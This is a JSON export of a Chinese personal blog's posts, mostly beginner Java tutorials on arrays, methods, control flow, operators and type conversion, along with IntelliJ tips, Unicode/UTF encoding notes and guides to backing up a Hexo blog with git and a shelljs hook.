int[]&#123;1,2,3,4&#125;; System.out.println(arr1[0]);//默认值为0; System.out.println(arr1[1]);//默认值为0; System.out.println(arr1[2]);//默认值为0; /*数组赋值*/ arr1[1] = 100; System.out.println(arr1[1]); &#125;&#125; 拆分格式 数据类型[] 数组名; 数组名 = new 数据类型名[]{元素1,元素2,…} 数组名 = new 数据类型名[长度]; 123456789public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;10,2,3,4&#125;; //arr = new int[10]; &#125;&#125; 静态初始化(指定内容) ​ 数据类型[] 数组名 = new 数据类型[] {元素1,元素2,…,元素n}; 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr = new int[]&#123;1,2,3,4&#125;; &#125;&#125; 省略格式 ​ 数据类型[] 数组名 = {元素1,元素2,…,元素n}; 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr = &#123;1,2,3,4&#125;; &#125;&#125; 拆分格式 ​ 不能再用省略格式 ​ 数据类型[] 数组名; ​ 数组名 = new 数据类型名[]{元素1,元素2,…} 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;1,2,3,4,5&#125;; &#125;&#125; 访问数组元素 ​ 直接打印数组名,会打印数组内存地址哈希值 ​ 格式 : 数组名[索引值] ​ 索引值从0开始到数组长度-1结束 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;1,2,3,4,5&#125;; System.out.println(arr);//打印数组内存地址哈希值 System.out.println(arr[0]);//使用数组下标访问数组元素 for(int i = 0; i &lt; arr.length;i++)//数组下标不大于数组的长度 &#123; System.out.println(arr[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"方法定义和使用","slug":"java00009方法定义和使用","date":"2020-02-05T21:13:51.000Z","updated":"2020-02-05T21:34:04.363Z","comments":true,"path":"2020/02/06/java00009方法定义和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00009方法定义和使用/","excerpt":"","text":"方法 方法定义 ​ 以public static开头 ​ public static 类型 方法名() ​ { ​ } 12345678910public class test010 &#123; public static void main(String[] args) &#123; System.out.println(\"\"); &#125; public static void funName(int a) //方法定义 &#123; //语句块 &#125;&#125; 方法的三种调用格式 单独调用 ​ 方法名（[参数]） 12345678910public class test010 &#123; public static void main(String[] args) &#123; funName(20); System.out.println(\"\"); &#125; public static void funName(int a) //方法定义 &#123; //语句块 &#125;&#125; 打印调用 ​ System.out.println(方法名（[参数]）) 12345678910public class test010 &#123; public static void main(String[] args) &#123; System.out.println( funName(20) ); &#125; public static int funName(int a) //方法定义 &#123; return a + 10; &#125;&#125; 赋值调用 ​ int a = 方法名（[参数]） 12345678910public class test010 &#123; public static void main(String[] args) &#123; int a = funName(20);//赋值调用 &#125; public static int funName(int a) //方法定义 &#123; return a + 10; &#125;&#125; 方法分为两种 参数 ​ 有参数 ​ 无参数 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) //有参数方法定义 &#123; return a + 10; &#125; public static int funName() //无参数方法定义 &#123; return 10; &#125;&#125; 返回值 ​ 有返回值 ​ 无返回值 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) //有返回值方法定义 &#123; return a + 10; &#125; public static void funName() //无返回值方法定义 &#123; return ; &#125;&#125; 方法注意事项 方法应该定义类中，不能定义在方法中 方法定义没有前后顺序 方法定义之后不会自动执行，需要手动调用 如果方法有返回值，必须写上 return 返回值 返回的数据必须要和返回值类型一致 对于void返回值类型，可以只写return； 一个方法可以有多个return，但只能执行其中一个 方法重载Overload 如果功能相同，参数不同，可以使用方法重载 特征 ​ 方法名要相同 ​ 参数个数不同 ​ 参数类型不同 ​ 类型名 参数顺序不同 12345678910111213141516171819202122232425public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) &#123; return a + 10; &#125; public static int funName() //参数个数不同 &#123; return 10; &#125; public static int funName(int a,int b) //参数个数不同 &#123; return a + b; &#125; public static int funName(double a,int b) //参数类型不同 &#123; return (int)a + b; &#125; public static int funName(int a,double b) //参数顺序不同 &#123; return a + (int)b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"集成开发环境","slug":"java00008集成开发环境","date":"2020-02-05T20:49:36.000Z","updated":"2020-02-05T21:13:05.461Z","comments":true,"path":"2020/02/06/java00008集成开发环境/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00008集成开发环境/","excerpt":"","text":"集成开发软件 IntelliJ IDEA ​ 官方网站 www.jetbrains.com ​ 先新建项目,再新建模块,然后新建包,最后新建源文件 ​ 输入psvm 回车 ​ 自动生成public static void main(String[] args) { ​ 会自动保存 快捷键 ​ alt + 4 显示输出框 ​ shift + f10 编译运行 ​ alt + enter 自动修复代码 ​ ctrl + y 删除光标所在行 ​ ctrl + d 复制光标当前行,插入光标位置下面 ​ ctrl+alt + L 格式化代码 ​ ctrl + / 单行注释,再按一次取消单行注释 ​ Ctrl+Shift +/ 多行注释 ​ alt+ins 自动生成代码 ​ alt+shift +上下箭头 移动当前代码行 ​ shift + f6 一个改全部改 ​ ctrl + 鼠标左键 转到方法定义处 设置 ​ 设置字体 ​ file-&gt;settings…-&gt; editor-&gt; Font-&gt;size 设置自动提示快捷键 ​ file-&gt;settings…-&gt;点击齿轮-&gt;Duplicate 复制一份 -&gt;Main menu -&gt; code -&gt; completion -&gt;basic 项目和模块的关闭和导入 关闭 file -&gt; close project 导入 Open -&gt; 选择项目文件 有小黑块的 然后一直下一步 模块 移除 ​ Remove Moudle 导入 ​ File -&gt; Project Structure -&gt; Import Moudle -&gt;一直选next -&gt;OK","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"基本结构","slug":"java00007基本结构","date":"2020-02-05T13:07:02.000Z","updated":"2020-02-05T13:36:13.790Z","comments":true,"path":"2020/02/05/java00007基本结构/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/java00007基本结构/","excerpt":"","text":"顺序结构 ​ 从上到下,顺序执行 选择结构 单if语句 ​ if(条件表达式){语句块} 123456789public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11; if(a &lt; b) &#123; System.out.println(a); &#125; &#125;&#125; 标准if else语句 ​ if(条件表达式){语句块;}else{语句块} 1234567891011public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11; if(a &lt; b) &#123; System.out.println(a); &#125;else&#123; System.out.println(b); &#125; &#125;&#125; 多层if语句 ​ if(条件表达式){语句块;}else if(条件表达式){语句块}else{语句块} 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11,c =12; if(a &gt; b &amp;&amp; a &gt; c) &#123; System.out.println(a); &#125;else if(b &gt; c &amp;&amp; b &gt; a)&#123; System.out.println(b); &#125;else&#123; System.out.println(c); &#125; &#125;&#125; switch ​ 选择对应于的常量,并执行对应常量的语句 ​ switch(表达式) { ​ case 常量1: ​ 语句; ​ break; ​ case 常量2: ​ 语句; ​ break; ​ default: ​ 语句; } 1234567891011121314151617public class test010 &#123; public static void main(String[] args) &#123; char c = 'A'; switch(c) &#123; case 'A': System.out.println(\"X&gt;=90\"); break; case 'B': System.out.println(\"80&gt;=X&lt;90\"); break; default: System.out.println(\"X&lt;79\"); &#125; &#125;&#125; 常量类型 整型 ​ byte,char,short,int 引用数据类型 ​ String,enum ​ 常量值不能重复 循环结构 for循环语句 for(变量初始化;条件判断;改变变量值) { 语句块; } 12345678public class test010 &#123; public static void main(String[] args) &#123; for(int i = 0;i &lt; 10;i++) &#123; System.out.println(i); &#125; &#125;&#125; while循环语句 while(条件) { 语句块; } 12345678910public class test010 &#123; public static void main(String[] args) &#123; int i = 0; while(i &lt; 10) &#123; System.out.println(i); i++; &#125; &#125;&#125; do while循环语句 初始化表达式 do{ ​ 语句块; }while(条件表达式); 123456789public class test010 &#123; public static void main(String[] args) &#123; int i = 0; do&#123; System.out.println(i); &#125;while(i++ &lt; 10); &#125;&#125; break ​ 中止循环 continue ​ 结束本次循环 死循环 ​ java可以有死循环 12345678public class test010 &#123; public static void main(String[] args) &#123; while(1) &#123; //我是死循环 &#125; &#125;&#125; 循环嵌套 ​ 一个循环体嵌套着另一个循环体这就叫做循环嵌套 123456789101112public class test010 &#123; public static void main(String[] args) &#123; for(int i = 0;i &lt; 10;i++) &#123; for(int j = 0;j &lt; 10;j++) &#123; System.out.print(\"*\"); &#125; System.out.println(\"\"); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用hexo+GitHub搭建的个人博客 文件备份","slug":"使用hexo-GitHub搭建的个人博客-文件备份","date":"2020-02-05T12:10:54.000Z","updated":"2020-02-05T12:19:28.220Z","comments":true,"path":"2020/02/05/使用hexo-GitHub搭建的个人博客-文件备份/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/使用hexo-GitHub搭建的个人博客-文件备份/","excerpt":"","text":"使用hexo+GitHub搭建的个人博客 文件备份 1.在GitHub中创建 hexo 分支来存储本地 markdown 文件 在本地文件根目录创建 .gitignore 文件，若存在修改为 123456.DS_Store*.lognode_modules/.deploy*/public/db.json 在本地文件根目录中初始化 git 1git init 创建分支hexo 1git checkout -b hexo 提交到仓库，需要注意的事在提交之前要把themes目录下主题中的 .git 文件夹重命名或者删除，不然的话 git 会把主题当做子模块来处理。 12git add .git commit -m &apos;init&apos; 添加远程仓库 1git remote add origin git@github.com:MrWangwj/MrWangwj.github.io.git push 到远程分支 1git push origin hexo 2.在另一台电脑上使用 首先要克隆下这个项目 1git clone git@github.com:MrWangwj/MrWangwj.github.io.git 进入博客目录 1cd MrWangwj.github.io.git 切换到博客文件分支 1git checkout -b hexo origin/hexo 安装hexo 1npm install hexo --save 然后编辑、查看 12hexo g //编译hexo s //浏览器查看 localhost:4000 提交 git，若在提交过程中出现 ERROR Deployer not found: git 可执行 npm install hexo-deployer-git --save 后重新提交。 1hexo d 在写了新 markdown 文件后提交 git 123git add .git commit -m &apos;新增博客&apos;git push origin hexo 到此，我们以后只要写完博客发布后记得 push 一下就能实现备份了。","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"自动备份Hexo源文件","slug":"自动备份Hexo源文件","date":"2020-02-05T10:16:47.000Z","updated":"2020-02-05T11:11:10.150Z","comments":true,"path":"2020/02/05/自动备份Hexo源文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/自动备份Hexo源文件/","excerpt":"","text":"自动备份Hexo源文件 前言 配置一个Hexo博客往往需要作者倾注大量心血，而如果哪天电脑坏了或者换电脑导致Hexo源文件丢失的话就是一件比较杯具的事。因此本文给出了一种自动备份Hexo源文件到Github的方法，能够在执行hexo deploy命令后自动执行Git命令以推送Hexo源文件到Github仓库。 原理 NodeJS的事件监听机制能够监听Hexo的事件。通过查询Hexo文档，找到了Hexo的主要事件，见下表： 事件名 描述 deployBefore 在部署完成前发布。 deployAfter 在部署成功后发布。 exit 在Hexo 结束前发布。 generateBefore 在静态文件生成前发布。 generateAfter 在静态文件生成后发布。 new 在文章文件建立后发布。该事件返回文章参数。 processBefore 在处理原始文件前发布。此事件会返回一个地址，代表 Box（Box）的根目录。 processAfter 在原始文件处理后发布。此事件会返回一个地址，代表 Box（Box）的根目录。 ready 在初始化完成后发布。 通过查询上表发现，我们可以通过监听Hexo的deployAfter事件，待部署成功后自动运行Git备份命令，从而达到自动备份的目的。 实现 将Hexo目录加入Git仓库 首先需要在Github创建一个新的repository,名字与本地Hexo文件夹同名即可。然后进入本地Hexo文件夹，按顺序执行以下命令： 123git initgit remote add origin git@github.com:yourname/hexo.gitgit pull origin master 再每次执行hexo generate命令时，public/、.deploy、\\*.log文件夹会重写更新，因此需要在.gitignore文件（如果没有，手动创建一个）中写入public/、.deploy、\\*.log以忽略这几个目录，加快备份的速度。 然后再顺序执行以下命令，将文件推送到Github： 123git add .git commit -m &quot;备份hexo源码文件&quot;git push origin master 这三行命令便是手动推送本地文件到Github的命令,我们接下来要做的是让NodeJS监听到Hexo的deployAfter事件后自动执行上述命令。 安装shelljs模块 键入以下命令即可 1npm install --save shelljs 加入自动执行脚本 在Hexo根目录的scripts文件夹（没有就自己创建一个）下新建一个js文件，文件名随意。然后加入以下代码： 1234567891011121314151617181920212223242526272829303132333435require('shelljs/global');try &#123; hexo.on('deployAfter', function() &#123;//当deploy完成后执行备份 run(); &#125;);&#125; catch (e) &#123; console.log(\"产生了一个错误&lt;(￣3￣)&gt; !，错误详情为：\" + e.toString());&#125;function run() &#123; if (!which('git')) &#123; echo('Sorry, this script requires git'); exit(1); &#125; else &#123; echo(\"======================Auto Backup Begin===========================\"); cd('path to hexo'); //此处修改为Hexo根目录路径 if (exec('git add --all').code !== 0) &#123; echo('Error: Git add failed'); exit(1); &#125; if (exec('git commit -am \"Form auto backup script\\'s commit\"').code !== 0) &#123; echo('Error: Git commit failed'); exit(1); &#125; if (exec('git push origin master').code !== 0) &#123; echo('Error: Git push failed'); exit(1); &#125; echo(\"==================Auto Backup Complete============================\") &#125;&#125; 注意上述代码中第29行需要修改为自己Hexo文件夹的绝对路径。 效果 如果脚本运行成功，会得到类似以下的效果： 1234567891011121314======================Auto Backup Begin===========================cd: no such file or directory: C:/Users/17810/OneDrive/hexowarning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.[master a6cb4c7] Form auto backup script&apos;s commit 1 file changed, 153 insertions(+)warning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.To git@github.com:JacobZjw/hexo.git 0beaf4c..a6cb4c7 master -&gt; master==================Auto Backup Complete============================ 懒癌患者的小福利 在hexo中，我们常常使用hexo new命令来新建文章。然鹅，当我们的文章较多时，我们往往需要在成堆的文章中找到刚刚生成的文件，然后使用Markdown编辑器打开。作为一名懒癌患者怎么可能让自己如此受累。 于是，我找到了Hexo作者给出的解决办法 和上面类似，在scripts文件夹中创建一个js文件，添加以下代码： 1234567891011var spawn = require('child_process').exec;// Hexo 2.x 用户复制这段hexo.on('new', function(path)&#123; spawn('start \"markdown编辑器绝对路径.exe\" ' + path);&#125;);// Hexo 3 用户复制这段hexo.on('new', function(data)&#123; spawn('start \"markdown编辑器绝对路径.exe\" ' + data.path);&#125;); 保存并退出脚本之后，在命令行中键入： 1hexo new &quot;auto open editor test&quot; 是不是就顺利的自动打开了自动生成的md文件啦~","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"JDK9的JShell-编译器的两点优化","slug":"java00006JDK9的JShell-编译器的两点优化","date":"2020-02-04T00:17:40.000Z","updated":"2020-02-04T00:36:20.957Z","comments":true,"path":"2020/02/04/java00006JDK9的JShell-编译器的两点优化/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00006JDK9的JShell-编译器的两点优化/","excerpt":"","text":"JDK9的JShell 什么时候会用到 JShell 工具呢，当我们编写的代码非常少的时候，而又不愿意编写类，main方法，也不愿意去编译和运 行，这个时候可以使用JShell工具。 启动JShell工具，在DOS命令行直接输入JShell命令。 打开cmd ​ 输入jshell ​ 退出/exit 编译器的两点优化 byte,short,char类型右侧没有超过本身范围,会自动强制转换类型 byte a = 12 常量优化 1 + 1常量表达式 在编译时会计算结果,而不是在运行时计算 12345public class test010 &#123; public static void main(String[] args) &#123; byte a = 12 //隐式的把12从int类型转换为byte类型 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java方法","slug":"java00005方法","date":"2020-02-04T00:02:04.000Z","updated":"2020-02-04T00:15:05.122Z","comments":true,"path":"2020/02/04/java00005方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00005方法/","excerpt":"","text":"方法 定义 ​ public static void 方法名称(){语句块} ​ 方法的定义是无序性的 ​ 不能嵌套定义方法 命名方法 ​ 小驼峰式法 方法调用 格式 ​ 方法名称(); 12345678910111213public class test009 &#123; public static void main(String[] args) &#123; System.out.println(intAdd(10,20));//方法调用 &#125; //方法定义 public static int intAdd(int a,int b) &#123; return a + b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java运算符","slug":"java00004java运算符","date":"2020-02-03T23:09:34.000Z","updated":"2020-02-04T00:02:38.881Z","comments":true,"path":"2020/02/04/java00004java运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00004java运算符/","excerpt":"","text":"运算符 基本运算符 + - * / % 自增自减 – ++ 复合运算符 += -= *= /= %= 默认会强制类型转换 类型不同运算时,返回的结果为较大范围的类型 123456789101112131415161718192021222324public class test007 &#123; public static void main(String[] args) &#123; int a = 10,b = 20,c = 0; c = a + b; System.out.println(c); c = a - b; System.out.println(c); c = a * b; System.out.println(c); c = a / b; System.out.println(c); c = a % b; System.out.println(c); c += a / a; // c = c + (a / a) System.out.println(c); &#125;&#125; String 字符串类型 String 变量名 字符串 + 字符串 = 拼接字符串 12345678public class test008 &#123; public static void main(String[] args) &#123; String str = \"abc\"; System.out.println(str + \"efg\"); &#125;&#125; 比较运算符 &gt; 大于 &lt; 小于 = 等于 &lt;= 小于等于 &gt;= 等于等于 == 等于 != 不等于 运算结果都是布尔值 12345678910public class test008 &#123; public static void main(String[] args) &#123; boolean isTrue; int a = 100,b = 99; isTrue = a &gt; b; System.out.println(isTrue); &#125;&#125; 逻辑运算符 &amp;&amp;(与),||(或),!(非) &amp;&amp; 两个条件为真,结果才为真 || 只要有一个条件为真,结果就为真 ! 真就是假,假就是真 12345678910public class test008 &#123; public static void main(String[] args) &#123; boolean isTrue; int a = 100,b = 99,c = 101; isTrue = a &gt; b &amp;&amp; a &lt; c; System.out.println(isTrue); &#125;&#125; 三元运算符 变量名 = 条件判断 ? 表达式A :表达式B ​ 条件为真返回表达式A,否则返回表达式B ​ 两个表达式类型要和变量类型一致 ​ 运算结果必须被使用 123456789public class test008 &#123; public static void main(String[] args) &#123; int a = 100,b = 99,c; c = (a &gt; b)? a : b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ASCII码-Unicode码","slug":"java00003ASCII码-Unicode码","date":"2020-02-03T22:26:00.000Z","updated":"2020-02-03T23:07:54.372Z","comments":true,"path":"2020/02/04/java00003ASCII码-Unicode码/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00003ASCII码-Unicode码/","excerpt":"","text":"ASCII码 从0到255都是ASCLL码 美国信息交换标准代码(American Standard Code For Information Interchange) Unicode Unicode 编码包含 ASCII 前面127的完全一样 称为万国码 Unicode（统一码、万国码、单一码）于1990年开始研发，1994年正式公布，是计算机领域里一项业界标准，包括字符集，编码方案等。Unicode是为了解决传统字符编码方案的局限而产生的，为每种语言中的每个字符都设定了统一唯一的二进制编码，以实现跨语言、跨平台进行文本转换、处理的要求。 计算机在设计时采用8个比特(bit)作为一个字节(byte)，所以一个字节最多能表示256个字符，早期对于使用英文的西方国家来说，一个字节可以存储大小写英文字母、数学和一些符号，因此使用一个字节来制作码表（ASCII）。后来计算机传到了其他的国家，很多国家都是使用自己的语言，比如中文、日文、韩文…语言复杂了，为了解决这个问题，每个国家制定自己的码表，中国在1980年便制定了GB2312汉字编码字符集，汉字比英文多很多，一个字节明显不够用，所有就使用2个字节来编码。然而不同国家所定义的字符编码虽然可以使用，但是在不同的国家间却经常出现不兼容的情况。如果电脑想处理多语言环境（使用中文或其他语言）可能存在无法同时支持多语言环境。 为了统一所有文字的编码，产生了Unicode,把所有语言的都统一到一套编码里，这样就不会乱码了。 在表示Unicode字符时，通常会用U+然后紧跟一组16进制的数字表示一个字符，在基本多文种平面（第零平面）Basic MultilingualPlane（BMP）里所有的字符都使用4位16进制表示。编码从U+0000到U+FFFF,共支持6万多个字符，在BMP以外的字符则需要使用5位或者6位16进制来表示。 目前Unicode字符分为17组编排，0x0000至0x10FFFF,每组称为平面（Plane）,每个面拥有65536个码位，共1114112个。 Unicode就像一张表，包所有的字符都编写到表中，每一个字符对应一个数字，称为码点（code point）,这个数字一般不直接使用，通过不同的编码方式来使用。 UTF-8、UTF-16、UTF-32就是将数字转换到程序数据的编码方案。UTF是“UnicodeTransformation Format”的缩写，可以翻译成Unicode字符集转换格式，即怎样将Unicode定义的数字转换成程序数据。 UTF-8 UTF-8是以字节位单位对Unicode编码，第0-127位字符使用1个字节来表示，和ASCII编码相同，从128号开始的字符使用2、3、4位字节来表，UTF-8又被称为可变长编码。 UTF-8编码中，使用的是变成的字节序列表示字符，字符对应的代码点（code point）可能使用的是1-4个字节，这样一个字节就是一个代码单元。一个代码点（code point）可能由1-4个代码单元（code unit）组成。 十进制 Unicode编码 UTF-8字节流 0-127位 0x000000-0x00007F 0xxxxxxx(7位) 128-2047位 0x000080-0x0007FF 110xxxxx 10xxxxxx（11位） 2048-65535位 0x000800-0x00FFFF 1110xxxx 10xxxxxx 10xxxxxx(16位) 65536-1114111位 0x010000-0x10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx(21位) 比如：“汉”在Unicode中的编码为0x6C49,在表格中的第三行，使用模板为：1110xxxx 10xxxxxx10xxxxxx。将0x6C49转换成二进制：0110 1100 0100 1001，将模板中的x依次替换11100110 10110001 10001001，即E6 B1 89。 UTF-16 UTF-16也是可变长度编码，使用2个或者4个字节来存储字符，但是会浪费存储空间。 UTF-16编码中，字符对应的代码点（code point）可能使用的是2或4个字节，因此2个字节就是一个代码单元（code unit）,一个代码点（codepoint）可由1个或者2个代码单元（code unit）组成。 十进制 Unicode编码 UTF-16字节流 0-65535位 0x000000-0x00FFFF xxxxxxxx xxxxxxxx(16位) 65536-1114111位 0x010000-0x10FFFF 110110yy yyyyyyyy 110111xx xxxxxxxx(20位) 平面0有一个专用区：0xE000-0xF8FF，有6400个码位。平面0的0xD800-0xDFFF，共2048个码位，是一个被称作代理区（Surrogate）的特殊区域。代理区的目的用两个UTF-16字符表示BMP以外的字符。所有大于0x00FFFF的码需要使用代理区的码点。 为了将一个16位无符号整数的UTF-16编码与二个16位无符号整数的UTF-16编码区分开来，Unicode编码的设计者将0xD800-0xDFFF保留下来，并称为代理区（Surrogate）： 十进制 Unicode编码 说明 说明 55296-56191 0xD800－0xDB7F（896个） High Surrogates 高位替代 56192-56913 0xDB80－0xDBFF（128个） High Private Use Surrogates 高位专用替代 56320-57343 0xDC00－0xDFFF（1024个） Low Surrogates 低位替代 增补的16个平面（第2平面-第17平面），范围为：0x010000-0x10FFFF，需要使用2个代理码元表示，第一个码元为0xD800-0xDBFF(高位)范围是:11011000 00000000到11011011 11111111，第二个码元为0xDC00－0xDFFF（低位）范围是：11011100 00000000到11011111 11111111。 目前Unicode最大的码位是0x10FFFF，减去0x010000后最大值为0xFFFFF，完全可以用20位来表示。 把Unicode编码记作U，如果U≥0x10000，我们先计算U’=U-0x10000，然后将U’写成二进制形式：yyyy yyyy yyxx xxxx xxxx，U的UTF-16编码（二进制）就是：110110yyyyyyyyyy110111xxxxxxxxxx 比如：Unicode编码0x20C30，减去0x10000后，得到0x10C30，写成二进制是：0001 0000 1100 0011 0000。用前10位依次替代模板中的y，用后10位依次替代模板中的x，就得到： 1101100001000011 1101110000110000，即0xD8430xDC30。 UTF-32 UTF-32编码以32位无符号整数为单位。Unicode的UTF-32编码就是其对应的32位无符号整数。 UTF-32编码，一个代码点对应4个字节，因此4个字节就是一个代码单元（codeunit）。 十进制 Unicode编码 UTF-32字节流 0-111411位 0x000000-0x10FFFF xxxxxxxx xxxxxxxx xxxxxxxx xxxxxxxx (32位) 比如：编码0x6C49使用UTF-32编码其结果为：0x00006C49。 字节序 字节序有两种，分别是大端（Big Endian, BE）和小段（Little Endian, LE）。根据字节序的不同，UTF-16实现为UTF-16BE和UTF-16LE，UTF-32实现为UTF-32BE和UTF-32LE。 根据字节序的不同，UTF-16可被实现为UTF-16LE或UTF-16BE，UTF-32可被实现为UTF-32LE或UTF-32BE。 Unicode编码 UTF-16LE UTF-16BE UTF32-LE UTF32-BE 0x006C49 49 6C 6C 49 49 6C 00 00 00 00 6C 49 0x020C30 43 D8 30 DC D8 43 DC 30 30 0C 02 00 00 02 0C 30 Unicode标准建议用BOM（Byte Order Mark）来区分字节序，即在传输字节流前，先传输被作为BOM的字符“零宽无中断空格”。这个字符的编码是FEFF，而反过来的FFFE（UTF-16）和FFFE0000（UTF-32）在Unicode中都是未定义的码位，不应该出现在实际传输中。 UTF编码的BOM： UTF编码 Byte Order Mark (BOM) UTF-8 without BOM 无 UTF-8 with BOM EF BB BF UTF-16LE FF FE UTF-16BE FE FF UTF-32LE FF FE 00 00 UTF-32BE 00 00 FE FF","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"IntelliJ IDEA 中自定义模板代码的缩写","slug":"java00000IntelliJ-IDEA-中自定义模板代码的缩写","date":"2020-02-03T21:58:59.000Z","updated":"2020-02-03T22:10:30.936Z","comments":true,"path":"2020/02/04/java00000IntelliJ-IDEA-中自定义模板代码的缩写/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00000IntelliJ-IDEA-中自定义模板代码的缩写/","excerpt":"","text":"IntelliJ IDEA 中自定义模板代码的缩写 方法一：新建 Live Template step1. 点击 File – Setting step2. 选择 Live Template，点击右侧的+号，选择 Template Group step3. 输入自定义的名称，然后点击OK。 step4. 选中刚创建的 Template Group，再次点击右侧的+号，选择Live Template step5. 填入缩写词、描述、模版内容、生效文件范围等 配置模板时，变量名以$ $包围的字符的形式出现,调用的方法也是先以变量形式出现，写完模板信息后去编辑变量(Edit variables)。 $END$是一个特殊的预定义变量，表示光标最后跳转的位置。 step6. 点击右边的Edit variables（这个只有在使用了预定义函数的时候才能点击和设置） step7. 点击 Apply ，OK，完成！ 方法二：使用 IDEA 自带的 Live Template psvm 生成 main 方法 fori 生成 for 循环 sout 生成 System.out.println(); … 方法三：修改 IDEA 自带的 Live Template 以将 psvm 修改成 main 和 sout 修改成 syso 为例：","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数据类型转换","slug":"java00002数据类型转换","date":"2020-02-03T20:59:05.000Z","updated":"2020-02-03T22:21:57.550Z","comments":true,"path":"2020/02/04/java00002数据类型转换/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00002数据类型转换/","excerpt":"","text":"数据类型转换 隐式 ​ 代码不需要进行特殊处理,自动处理 ​ 规则:数据范围从小到大 123456789101112public class test006 &#123; public static void main(String[] args) &#123; /*从小到大隐式转换*/ byte a = 1; short c = 3; int d = 4; long e = 5; e = d = c = a; System.out.println(e); &#125;&#125; 显示 ​ (类型名) 数据 ​ (类型名)(数据) ​ 可能发生数据溢出和精度损失 ​ byte/char/short整数运算默认会自动提升为int类型 ​ boolean类型不能发生数据类型转换 1234567891011121314public class test006 &#123; public static void main(String[] args) &#123; /*显示强制转换*/ byte a = 2; int b = 4; a = (byte)(b); System.out.println(a); b = 20; a = (byte)b; System.out.println(a); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"变量","slug":"java00001变量","date":"2020-02-03T20:46:10.000Z","updated":"2020-02-03T20:56:29.796Z","comments":true,"path":"2020/02/04/java00001变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00001变量/","excerpt":"","text":"变量 程序运行期间,内容可以发生改变的值称为变量 先定义后使用 变量声明 数据类型 变量名; 数据类型 变量名 = 初始值; 变量使用 变量名 = 值; 常量有默认类型,如果常量数值大于默认类型,需要手动转换类型 3000000000L 123456789public FileName&#123; public static void main(String[] args) &#123; int a; //变量声明 int b = 1; //变量声明 b = 21; //变量使用 &#125;&#125; 注意事项 ​ 变量名不能重复 ​ float和long类型的字母后缀F和L不能丢 ​ 右侧数值不能超过左侧数据类型范围 ​ 没有赋值的变量不能使用 ​ 变量使用不能超过作用域范围 ​ 作用域：从定义变量的那行起,到直接所属的大括号结束为止 ​ 可以用一条语句创建多个变量","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"基础知识","slug":"java00000基础知识","date":"2020-02-03T03:22:30.000Z","updated":"2020-02-08T09:11:36.411Z","comments":true,"path":"2020/02/03/java00000基础知识/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/03/java00000基础知识/","excerpt":"","text":"计算机基础知识 二进制 十进制转二进制 用辗转相除法: 二进制转十进制 用二进制分别乘以位权,在进行相加 存储单位 一般情况下最小单位为bit 1Byte = 8bit 1KB = 1024B 1MB = 1024KB 1GB = 1024MB 1TB = 1024GB 命令提示符 MS-DOS MS代表微软,DOS 代表 Disk Operating System （磁盘操作系统） 磁盘命令 改变磁盘符 直接 输入磁盘符 并按下回车 改变目录 cd 目录 按下tab键会自动补全 cd . . 返回上一层 cd \\ 回到根目录 dir遍历内容 dir . . 遍历上一层内容 dir . 遍历当前目录内容 dir 文件目录 遍历指定目录内容 dir 文件 遍历指定文件 cls 清屏 exit 